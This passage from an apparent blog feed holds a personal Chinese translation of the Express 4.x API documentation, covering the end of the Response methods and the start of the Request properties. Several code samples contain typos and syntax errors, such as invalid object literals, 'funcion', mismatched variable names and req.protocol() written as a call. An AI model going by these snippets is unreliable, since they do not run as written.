class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        res.send(<span class="string">'&lt;p&gt;hey&lt;/p&gt;'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    json:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        res.send(&#123;<span class="attr">message</span>:<span class="string">'hey'</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="res-get-field"><a href="#res-get-field" class="headerlink" title="res.get(field)"></a>res.get(field)</h3><p>返回由路由字段指定的http响应头(对大小写是不敏感的)</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.get(<span class="string">'Content-Tpye'</span>);  <span class="comment">// =&gt; 'text/plain'</span></span><br></pre></td></tr></table></figure><h3 id="res-json-body"><a href="#res-json-body" class="headerlink" title="res.json([body])"></a>res.json([body])</h3><p>发送一个JSON响应，这个方法和<code>res.send</code>是一样的传递一个对象或者数组作为参数.但是你可以使用它将其他值转化为JSON,例如null，undefined（虽然这些在技术上不是有效的JSON）</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.json(<span class="literal">null</span>)</span><br><span class="line">res.json(user:<span class="string">'tobi'</span>)</span><br><span class="line">res.status(<span class="number">500</span>).json(error:<span class="string">'message'</span>)</span><br></pre></td></tr></table></figure><h3 id="res-jsonp-body"><a href="#res-jsonp-body" class="headerlink" title="res.jsonp([body])"></a>res.jsonp([body])</h3><p>发送一个JSONP支持的JSON响应，这个方法和<code>req.json()</code>是相同的,除了他选择在JSONP的回调支持</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.jsonp(<span class="literal">null</span>) <span class="comment">// =&gt; null</span></span><br><span class="line"></span><br><span class="line">res.jsonp(&#123;<span class="attr">user</span>:<span class="string">'tobi'</span>&#125;)  <span class="comment">// =&gt; &#123;"user":"tobi"&#125;</span></span><br><span class="line"></span><br><span class="line">res.status(<span class="number">500</span>).jsonp(&#123;<span class="attr">error</span>:<span class="string">'message'</span>&#125;)  <span class="comment">// =&gt; &#123;"error":"message"&#125;</span></span><br></pre></td></tr></table></figure><p>以下是一些JSONP响应用相同的代码的栗子：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ?callback=foo</span></span><br><span class="line">res.jsonp(user:<span class="string">"tobi"</span>)  <span class="comment">// =&gt; foo(&#123;"user":"tobi"&#125;)</span></span><br><span class="line"></span><br><span class="line">app.set(<span class="string">'JSONP callback name '</span>,<span class="string">'cb'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ?cb=foo</span></span><br><span class="line">res.status(<span class="number">500</span>).jsonp(&#123;<span class="attr">error</span>:<span class="string">'message'</span>&#125;)  <span class="comment">// =&gt; foo(&#123;"error":"message"&#125;)</span></span><br></pre></td></tr></table></figure><h3 id="res-links-links"><a href="#res-links-links" class="headerlink" title="res.links(links)"></a>res.links(links)</h3><p>将提供的链接作为参数的属性添加到响应的<code>Link</code> HTTP 头字段</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.links(&#123;</span><br><span class="line">    next:<span class="string">'http://api.example.com/user?page=2'</span>,</span><br><span class="line">    last:<span class="string">'http://api.example.com/user?page=5'</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>产出</p><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Link:</span>&lt;<span class="symbol">http:</span>/<span class="regexp">/api.example.com/user</span>?page=<span class="number">2</span>&gt;; rel=<span class="string">'next'</span></span><br><span class="line">    <span class="symbol">:&lt;http</span><span class="symbol">://api</span>.example.com/user?page=<span class="number">5</span>&gt;; rel=<span class="string">'last'</span></span><br></pre></td></tr></table></figure><h3 id="res-location-path"><a href="#res-location-path" class="headerlink" title="res.location(path)"></a>res.location(path)</h3><p>设置响应<code>location</code>HTTP头为指定的path路径参数</p><figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">res</span><span class="selector-class">.location</span>(<span class="string">'/foo/bar'</span>);</span><br><span class="line"><span class="selector-tag">res</span><span class="selector-class">.location</span>(<span class="string">'http://example.com'</span>);</span><br><span class="line"><span class="selector-tag">res</span><span class="selector-class">.location</span>(<span class="string">'back'</span>);</span><br></pre></td></tr></table></figure><p>带有<code>back</code>参数的的路径带有特殊的意义，它指的是在请求的<code>Referer</code>报头指定的URL，如果没有被指定，它指向”/“</p><h3 id="res-redirect-status-path"><a href="#res-redirect-status-path" class="headerlink" title="res.redirect([status,] path)"></a>res.redirect([status,] path)</h3><p>重定向URL来自指定的路径，使用指定的HTTP状态码.如果没有指定状态，状态代码默认为’302 Found’</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.redirect(<span class="string">'/foo/bar'</span>);</span><br><span class="line">res.redirect(<span class="string">'http://example.com'</span>);</span><br><span class="line">res.redirect(<span class="number">301</span>,<span class="string">'http://example.com'</span>);</span><br><span class="line">res.redirect(<span class="string">'../login'</span>);</span><br></pre></td></tr></table></figure><p>重定向可以完全的将URL重定向到另一个不同的网站</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.redirect(<span class="string">'http://google.com'</span>);</span><br></pre></td></tr></table></figure><p>重定向可以使用相对主机的路径，例如，如果你的应用程序是”<a href="http://example.com/admin/post/new&quot;，下面将会将它重定向到&quot;http://example.com/admin&quot;" target="_blank" rel="noopener">http://example.com/admin/post/new&quot;，下面将会将它重定向到&quot;http://example.com/admin&quot;</a></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.redirect(<span class="string">'/admin'</span>)</span><br></pre></td></tr></table></figure><p>重定向可以相对于当前的URL，例如来自”<a href="http://example.com/blog/admin/&quot;(注意最后的尾斜杠)，下面将重定向到&quot;http://example.com/blog/admin/post/new&quot;" target="_blank" rel="noopener">http://example.com/blog/admin/&quot;(注意最后的尾斜杠)，下面将重定向到&quot;http://example.com/blog/admin/post/new&quot;</a></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.redirect(<span class="string">'post/new'</span>)</span><br></pre></td></tr></table></figure><p>如果上面admin最后没有尾斜杠，将会重定向至”<a href="http://example.com/blog/post/new&quot;" target="_blank" rel="noopener">http://example.com/blog/post/new&quot;</a></p><blockquote><p>如果你发现上述行为令人困惑，把路径段看做目录（尾随斜杠）和文件，他将开始变得有意义</p></blockquote><p>相对路径的重定向也是有可能的，如果你是”<a href="http://example.com/admin/post/new&quot;,下面将会重定向到&quot;http://example.com/admin/post&quot;" target="_blank" rel="noopener">http://example.com/admin/post/new&quot;,下面将会重定向到&quot;http://example.com/admin/post&quot;</a></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.redirect(<span class="string">'..'</span>);</span><br></pre></td></tr></table></figure><p>一个<code>back</code>重定向到请求返回<code>referer</code>，如果<code>referer</code>丢失默认为’/‘</p><h3 id="res-render-view-locals-callback"><a href="#res-render-view-locals-callback" class="headerlink" title="res.render(view[,locals][,callback])"></a>res.render(view[,locals][,callback])</h3><p>呈现视图并将HTML发送给客户端，可选参数：</p><ul><li>locals,属性定义视图的局部变量的对象</li><li>callback,回调函数，如果提供的话，返回可能的错误和呈现的字符串，但并不自动响应.当错误发生时,该方法在内部调用<code>next(err)</code><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.render(<span class="string">'index'</span>)</span><br><span class="line"></span><br><span class="line">res.render(<span class="string">'index'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">err,html</span>)</span>&#123;</span><br><span class="line">    res.send(html)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将局部变量传递给视图</span></span><br><span class="line">res.render(<span class="string">'user'</span>,&#123;<span class="attr">name</span>:<span class="string">'tobi'</span>&#125;,<span class="function"><span class="keyword">function</span>(<span class="params">err,html</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// ..</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ul><h3 id="res-send-body"><a href="#res-send-body" class="headerlink" title="res.send([body])"></a>res.send([body])</h3><p>发送http响应<br><code>body</code>参数可以是一个<code>buffer</code>对象，字符串，对象，数组.举个栗子：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.send(<span class="keyword">new</span> Buffer(<span class="string">'whoop'</span>))</span><br><span class="line">res.send(&#123;<span class="attr">some</span>:<span class="string">'json'</span>&#125;)</span><br><span class="line">res.send(<span class="string">'&lt;p&gt;some html&lt;/p&gt;'</span>)</span><br><span class="line">res.status(<span class="number">404</span>).send(<span class="string">'sorry,er can not find that!'</span>)</span><br><span class="line">res.status(<span class="number">500</span>).send(&#123;<span class="attr">error</span>:<span class="string">'something brew up'</span>&#125;)</span><br></pre></td></tr></table></figure><p>当参数是一个buffer对象时，该方法设置<code>Content-Type</code>响应头字段为<code>application/octet-stream</code>，除非先定义如下所示：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.set(<span class="string">'Content-Type'</span>:<span class="string">'text/html'</span>)</span><br><span class="line">res.send(<span class="keyword">new</span> Buffer(<span class="string">'&lt;p&gt;some html&lt;/p&gt;'</span>))</span><br></pre></td></tr></table></figure><p>当参数为字符串时，这个方法设置’Content-Type’为’text/html’</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.send(<span class="string">'&lt;p&gt;some html&lt;/p&gt;'</span>)</span><br></pre></td></tr></table></figure><p>当参数为数组或者对象时，Express用JSON表示响应</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.send(&#123;<span class="attr">user</span>:<span class="string">'tobi'</span>&#125;)</span><br><span class="line">res.send([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])</span><br></pre></td></tr></table></figure><h3 id="res-sendFile-path-options-fn"><a href="#res-sendFile-path-options-fn" class="headerlink" title="res.sendFile(path[,options][,fn])"></a>res.sendFile(path[,options][,fn])</h3><blockquote><p>res.sendFile()在Express v4.8.0之前被支持</p></blockquote><p>在给定路径上传输文件，根据文件的扩展设置”Content-Tpye”响应HTTP头字段.除非在选项对象中设置根选项，路径必须是文件的绝对路径</p><p>下表中列出了选项对象中的详细信息</p><table><thead><tr><th>Property</th><th>Description</th><th>Default</th><th>Availability</th></tr></thead><tbody><tr><td>maxAge</td><td>以毫秒为单位设置max-age缓存控制头或者MS格式的字符串</td><td>0</td><td></td></tr><tr><td>root</td><td>相关文件的根目录</td><td></td><td></td></tr><tr><td>lastModified</td><td>设置last-modified头设置为操作系统上文件的最后修改日期，设置false禁用它</td><td>Enabled</td><td>4.9.0+</td></tr><tr><td>headers</td><td>包含与文件服务对象的HTTP头</td><td></td><td></td></tr><tr><td>dotfiles</td><td>可能值为”allow”,”deny”,”ignore”</td><td>“ignore”</td><td></td></tr></tbody></table><p>该方法调用一个回调函数<code>fn(err)</code>当传输完成或发生错误时.如果指定了回调函数并发生错误时，回调函数必须通过终止请求响应周期来显式地处理响应过程，或者传递控制给下一个路由</p><p>下面这个栗子使用了<code>res.sendFile()</code>的所有参数</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.send(<span class="string">'/file/:name'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> options=&#123;</span><br><span class="line">        root:__dirname+<span class="string">'/public'</span>,</span><br><span class="line">        dotfiles:<span class="string">'deny'</span>,</span><br><span class="line">        headers:&#123;</span><br><span class="line">            <span class="string">'x-timestamp'</span>:<span class="built_in">Date</span>.now(),</span><br><span class="line">            <span class="string">'x-sent'</span>:<span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> flieName = req.params.name;</span><br><span class="line">    res.sendFile(fileName,options,funcion(err)&#123;</span><br><span class="line">        <span class="keyword">if</span>(err)&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(err);</span><br><span class="line">            res.status(err.status).end();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">'Sent:'</span>, fileName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>res.sendFile()在下面的例子中，提供对文件服务的<code>fine-grained</code>支持，</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.get(<span class="string">'/user/:uid/photos/:file'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> uid = req.params.uid;</span><br><span class="line">    <span class="keyword">var</span> file = req.params.file;</span><br><span class="line"></span><br><span class="line">    req.user.mayViewFilesFrom(uid,<span class="function"><span class="keyword">function</span>(<span class="params">yes</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(yes)&#123;</span><br><span class="line">            res.sendFile(<span class="string">'/uploads/'</span> + uid + <span class="string">'/'</span> + file);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            res.status(<span class="number">403</span>).send(<span class="string">"sorry you cant\'s see that."</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="res-sendStatus-statusCode"><a href="#res-sendStatus-statusCode" class="headerlink" title="res.sendStatus(statusCode)"></a>res.sendStatus(statusCode)</h3><p>设置响应的HTTP状态码并将字符串形式作为响应体发送</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.sendStatus(<span class="number">200</span>);  <span class="comment">// 等于 res.status(200).send('ok')</span></span><br><span class="line">res.sendStatus(<span class="number">403</span>);  <span class="comment">// 等于 res.status(403).send('Forbidden')</span></span><br><span class="line">res.sendStatus(<span class="number">404</span>);  <span class="comment">// 等于 res.status(404).send('Not Found')</span></span><br><span class="line">res.sendStatus(<span class="number">500</span>);  <span class="comment">// 等于 res.status(500).send('Internal Server Error')</span></span><br></pre></td></tr></table></figure><p>如果指定了不受支持的状态代码，HTTP状态仍然设置状态码和代码的字符串版本为响应正文中发送</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.sendStatus(<span class="number">2000</span>)  <span class="comment">// 等于 res.status(2000).send('2000')</span></span><br></pre></td></tr></table></figure><p><a href="http://en.wikipedia.org/wiki/List_of_HTTP_status_codes" target="_blank" rel="noopener">More about HTTP Status Codes</a></p><h3 id="res-set-field-value"><a href="#res-set-field-value" class="headerlink" title="res.set(field [,value])"></a>res.set(field [,value])</h3><p>将HTTP响应头filed设置为value值.立即设置多个字段，传递一个对象作为参数</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.set(<span class="string">'Content-Type'</span>:<span class="string">'text/plain'</span>);</span><br><span class="line"></span><br><span class="line">res.set(&#123;</span><br><span class="line">    <span class="string">'Content-Type'</span>:<span class="string">'text.plain'</span>,</span><br><span class="line">    <span class="string">'Content-Length'</span>:<span class="string">'123'</span>,</span><br><span class="line">    <span class="string">'ETag'</span>:<span class="string">'12345'</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>别名为<code>res.header(field[,value])</code></p><h3 id="res-status-code"><a href="#res-status-code" class="headerlink" title="res.status(code)"></a>res.status(code)</h3><p>使用此方法为响应设置HTTP状态，这是一个连贯性的Node <code>response.statusCode</code>别名</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.status(<span class="number">403</span>).send();</span><br><span class="line">res.status(<span class="number">400</span>).send(<span class="string">'Bad Request'</span>);</span><br><span class="line">res.status(<span class="number">404</span>).sendFile(<span class="string">'/absolute/path/to/404.png'</span>)</span><br></pre></td></tr></table></figure><h3 id="res-type-type"><a href="#res-type-type" class="headerlink" title="res.type(type)"></a>res.type(type)</h3><p>将<code>Content-Type</code>的HTTP头设置为<code>MIME</code>类型,通过<code>mime.lookup</code>指定类型.如果类型包含’/‘字符，设置”Content-Type”为’type’</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.type(<span class="string">'.html'</span>)  <span class="comment">// =&gt; 'text/html'</span></span><br><span class="line">res.type(<span class="string">'html'</span>)  <span class="comment">// =&gt;'text/html'</span></span><br><span class="line">res.type(<span class="string">'json'</span>) <span class="comment">// =&gt; 'application/json'</span></span><br><span class="line">res.type(<span class="string">'application/json'</span>)  <span class="comment">// =&gt; 'application/json'</span></span><br><span class="line">res.type(<span class="string">'png'</span>) <span class="comment">// =&gt; image/png:</span></span><br></pre></td></tr></table></figure><h3 id="res-vary-field"><a href="#res-vary-field" class="headerlink" title="res.vary(field)"></a>res.vary(field)</h3><p>如果它不在那里，添加字段到<code>vary</code>响应头</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.vary(<span class="string">'User-Agent'</span>).render(<span class="string">'docs'</span>);</span><br></pre></td></tr></table></figure><h1 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h1><p>Express文档中Response部分就完成了，本人学识有限，难免有所纰漏，另外翻译仅仅是方便个人学习交流使用，无其他用意，原文地址：<a href="http://www.expressjs.com.cn/4x/api.html#res" target="_blank" rel="noopener">expressjs.com</a></p>]]></content>
      
      
      <categories>
          
          <category> Node </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Node </tag>
            
            <tag> Express </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Express4.x API (二)：Request (译)</title>
      <link href="/2017/12/20/epxress-api-cn-request/"/>
      <url>/2017/12/20/epxress-api-cn-request/</url>
      
        <content type="html"><![CDATA[<h1 id="Express4-x-API-译文-系列文章"><a href="#Express4-x-API-译文-系列文章" class="headerlink" title="Express4.x API 译文 系列文章"></a>Express4.x API 译文 系列文章</h1><ul><li><a href="http://www.cnblogs.com/okaychen/p/8108405.html" target="_blank" rel="noopener">Express4.x API (一)：application (译) – 完成</a></li><li><a href="http://www.cnblogs.com/okaychen/p/8081275.html" target="_blank" rel="noopener">Express4.x API (二)：request (译) – 完成</a></li><li><a href="http://www.cnblogs.com/okaychen/p/8087425.html" target="_blank" rel="noopener">Express4.x API (三)：Response (译) – 完成</a></li><li><a href="http://www.cnblogs.com/okaychen/p/8093717.html" target="_blank" rel="noopener">Express4.x API (四)：router (译) – 完成</a><a id="more"></a><h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1>最近学习express想要系统的过一遍API，<a href="www.expressjs.com">www.expressjs.com</a>是express英文官网(进入<a href="www.epxressjs.com.cn">www.epxressjs.com.cn</a>发现也是只有前几句话是中文呀~~)，所以自己准备在express学习的过程也翻译一遍API，一是熟悉Express文档，二是锻炼自己英语阅读能力.</li></ul><blockquote><p>原文地址：<a href="http://www.expressjs.com.cn/4x/api.html#req" target="_blank" rel="noopener">express.com</a></p></blockquote><h1 id="Request-请求"><a href="#Request-请求" class="headerlink" title="Request(请求)"></a>Request(请求)</h1><p><code>req</code>代表<code>http request</code>请求，具有请求查询字符串，参数，body，http头等等的性能。在本文件和惯例中，这个对象总是被简称为<code>req</code>(<code>http response</code>对象是<code>res</code>),但是它的实际名称取决于你正在工作的回调函数的参数</p><p>举个栗子：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.get(<span class="string">'/user/:id/'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    res.send(<span class="string">'user'</span> + req.params.id);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>当然你也可以这样：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.get(<span class="string">'user/"id/'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">request,response</span>)</span>&#123;</span><br><span class="line">    response.send(<span class="string">'user '</span> + request.params.id);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="Properties"><a href="#Properties" class="headerlink" title="Properties"></a>Properties</h2><blockquote><p>在express4.x中，<code>req.files</code>在默认情况下是不再可以被使用的，在<code>req.files</code>对象为了获得<code>upload files</code>，使用多个处理中间件,像 <code>busboy,formidable,multiparty,connect-multiparty</code>或者<code>pez</code></p></blockquote><h3 id="req-app"><a href="#req-app" class="headerlink" title="req.app"></a>req.app</h3><p>此属性持有对使用中间件的Express应用程序实例的引用</p><p>如果你按照所创建的一个模块，刚暴露一个中间件为了在你的主文件中使用它，然后中间件可以通过<code>req.app</code>访问Express实例</p><p>举个栗子：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// index</span></span><br><span class="line">app.get(<span class="string">"/viewdirectory/"</span>,<span class="built_in">require</span>(<span class="string">"./mymiddleware.js"</span>))</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// mymiddleware.js</span></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    res.send(<span class="string">'The views direction is " + req.app.get('</span>views<span class="string">'));</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="req-baseUrl"><a href="#req-baseUrl" class="headerlink" title="req.baseUrl"></a>req.baseUrl</h3><p>安装路由器的实例的URL路径</p><p>举个栗子：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> greet = express.Router();</span><br><span class="line">greet.get(<span class="string">'/jp'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(req.baseUrl)  <span class="comment">// greet</span></span><br><span class="line">    res.send(<span class="string">'Konichiwa!'</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.use(<span class="string">'/greet'</span>,greet)  <span class="comment">// load the router on '/greet'</span></span><br></pre></td></tr></table></figure><p>即使使用路径模式或一组路径模式来加载路由器，<code>baseUrl</code>特性返回匹配字符串，而不是模式(s),</p><p>在下面这个路径中，<code>greet</code>路径加载两个路由路径</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.use([<span class="string">'/gre+t'</span>,<span class="string">'hel&#123;2&#125;o'</span>],greet)   <span class="comment">// load the router on '/gre+t' and '/hel&#123;2&#125;o'</span></span><br></pre></td></tr></table></figure><p>当一个请求指向<code>/greet/jp</code>,<code>req.baseUrl</code>是’/greet’.当一个请求指向<code>/hello/jp</code>,<code>req.baseUrl</code>是<code>/hello</code><br><code>req.baseUrl</code>类似于<code>app.mountpath</code>,除了<code>app.mountpath</code>返回路径匹配的模式</p><h3 id="req-body"><a href="#req-body" class="headerlink" title="req.body"></a>req.body</h3><p>包含请求主体中提交数据的键值对.默认情况下，它是<code>undefined</code>,当时用<code>body-parsing</code>中间件例如<code>body-parser</code>和<code>multer</code>时被填充</p><p>下面这个栗子展示如何使用中间件来填充<code>req.body</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> app = <span class="built_in">require</span>(<span class="string">'express'</span>)</span><br><span class="line"><span class="keyword">var</span> bodyParser = <span class="built_in">require</span>(<span class="string">'body-parser'</span>)</span><br><span class="line"><span class="keyword">var</span> multer = <span class="built_in">require</span>(<span class="string">'multer'</span>)</span><br><span class="line"></span><br><span class="line">app.use(bodyParser.json());   <span class="comment">// 解析 application/json</span></span><br><span class="line">app.use(bodyParser.urlencoded(&#123;<span class="attr">extended</span>:<span class="literal">true</span>&#125;));   <span class="comment">// 解析 application/x-www-form-urlencoded</span></span><br><span class="line">app.use(multer())  <span class="comment">// 解析multipart/form-data</span></span><br><span class="line"></span><br><span class="line">app.post(<span class="string">'/'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(req.body)</span><br><span class="line">    res.json(req.body)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="req-cookies"><a href="#req-cookies" class="headerlink" title="req.cookies"></a>req.cookies</h3><p>当使用cookie-parser中间件，此属性是包含请求发送的cookie对象.如果请求不包含cookie，它默认为<code>{}</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Cookie:name = tj</span></span><br><span class="line">req.cookies.name  <span class="comment">// =&gt;"tj"</span></span><br></pre></td></tr></table></figure><h3 id="req-fresh"><a href="#req-fresh" class="headerlink" title="req.fresh"></a>req.fresh</h3><p>指示是否这个请求是”fresh”，他是和<code>req.stale</code>相反的。这是真的如果<code>cache-control</code>请求头没有一个<code>no-cache</code>指令，下面一项都是正确的：</p><ul><li>这个<code>if-modified-since</code>请求头是明确指定的，<code>last-modified</code>请求头等于或者更早于<code>modified</code>响应头</li><li><code>if-none-match</code>请求头是*</li><li><code>if-none-match</code>请求头，在解析到他的指令之后，不匹配<code>etag</code>的响应头</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">req.fresh <span class="comment">// =&gt; true</span></span><br></pre></td></tr></table></figure><h3 id="req-hostname"><a href="#req-hostname" class="headerlink" title="req.hostname"></a>req.hostname</h3><p>包含主机<code>host</code> http header的主机名</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HOST:“expample.com:3000”</span></span><br><span class="line">req.hostname <span class="comment">// =&gt; elample.com</span></span><br></pre></td></tr></table></figure><h3 id="req-ip"><a href="#req-ip" class="headerlink" title="req.ip"></a>req.ip</h3><p>请求的远程ip地址<br>如果信用代理<code>trust proxy</code>被设置为启用,它是<code>upstream</code>地址</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">req.ip  <span class="comment">// =&gt; 127.0.0.1</span></span><br></pre></td></tr></table></figure><h3 id="req-ips"><a href="#req-ips" class="headerlink" title="req.ips"></a>req.ips</h3><p>如果信用代理<code>trust proxy</code>被设置为启用,此属性在<code>X-Forwards-For</code>请求头包含指定的ip地址数组，否者他包含一个空数组.</p><h3 id="req-orignalUrl"><a href="#req-orignalUrl" class="headerlink" title="req.orignalUrl"></a>req.orignalUrl</h3><blockquote><p>req.url不是express的本身的属性，它是从节点的http模块继承来的</p></blockquote><p>这个属性和req.url非常相似，然而它保留起初的url请求,允许你自由的重req.url用于内部路由的目的。举个栗子，<code>app.use()</code>的’mounting’特性将会重写req.url的挂载点</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//  GET /serch?q=somting</span></span><br><span class="line">req.orignalUrl <span class="comment">//  =&gt; "/serch?q=somthing"</span></span><br></pre></td></tr></table></figure><h3 id="req-params"><a href="#req-params" class="headerlink" title="req.params"></a>req.params</h3><p>一个包含映射到命名路由”参数”的属性对象。举个栗子,如果你有这样的路由<code>/user:name</code>,然后这个”name”属性可以被作为<code>req.params.name</code>。这个对象默认为{}</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// GTE /user/tj</span></span><br><span class="line">req.parmas.name <span class="comment">// =&gt; "tj"</span></span><br></pre></td></tr></table></figure><p>当你使用正则表达式作为路由定义时，捕获组（capture group）在数组中使用req.params[n],其中n是第n个捕获组，此规则应用于未命名通配符通配符匹配，比如<code>/file/*</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// GET /file/javascripts/jquery.js</span></span><br><span class="line">req.params[<span class="number">0</span>]  <span class="comment">// =&gt; "javascript/jquery.js"</span></span><br></pre></td></tr></table></figure><h3 id="req-path"><a href="#req-path" class="headerlink" title="req.path"></a>req.path</h3><p>包含<code>request url</code>的部分路径</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// example.com/users?sort=decs</span></span><br><span class="line">req.path  <span class="comment">// =&gt; "/users"</span></span><br></pre></td></tr></table></figure><blockquote><p>当从中间件调用时，挂载点不包含在<code>req.path</code></p></blockquote><h3 id="req-protocol"><a href="#req-protocol" class="headerlink" title="req.protocol"></a>req.protocol</h3><p>请求协议字符串,当使用TSL请求时：http或者https。当（trust proxy）信任代理设置信任（scokets address）套接字，这个’X-Forward-Proto’的header（http，https）领域值将会被信任</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">req.protocol()  <span class="comment">// =&gt; "http"</span></span><br></pre></td></tr></table></figure><h3 id="req-query"><a href="#req-query" class="headerlink" title="req.query"></a>req.query</h3><p>包含路由中每个查询字符串参数的属性的对象，如果没有查询字符串，它是一个空对象{}</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// GET /serch?q=tobi+ferret</span></span><br><span class="line">req.query.q  <span class="comment">// "tobi ferret"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// GET /shoes?order=decs&amp;shoe[color]=blue&amp;shoe[type]=converse</span></span><br><span class="line">req.query.order  <span class="comment">// =&gt; "desc"</span></span><br><span class="line"></span><br><span class="line">req.query.shoe.color  <span class="comment">// =&gt; "blue"</span></span><br><span class="line"></span><br><span class="line">req.query.shoe.type  <span class="comment">// =&gt; "converse"</span></span><br></pre></td></tr></table></figure><h3 id="req-route"><a href="#req-route" class="headerlink" title="req.route"></a>req.route</h3><p>当前匹配的路由，字符串</p><p>举个栗子：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.get(<span class="string">'/user/:id?'</span>,functon userIdHandler(req,res)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(req.route);</span><br><span class="line">    res.send(<span class="string">'GET'</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>示例上一段代码的输出：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    path:<span class="string">'user/:id?'</span>,</span><br><span class="line">    stack:</span><br><span class="line">    [</span><br><span class="line">        &#123;</span><br><span class="line">            handle:[<span class="built_in">Function</span>:userIdHandler],</span><br><span class="line">            name:<span class="string">'userIdHandler'</span>,</span><br><span class="line">            